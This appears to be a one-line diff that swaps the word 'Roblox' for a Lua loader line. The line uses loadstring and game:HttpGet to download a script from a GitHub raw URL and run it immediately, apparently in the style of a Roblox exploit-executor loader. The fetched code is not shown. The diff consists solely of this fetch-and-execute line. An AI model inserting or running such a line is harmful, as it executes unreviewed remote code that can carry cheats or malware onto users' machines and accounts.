@@ -1,1 +1,1 @@
-Roblox
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PulseZax/Loader/refs/heads/main/.lua"))()
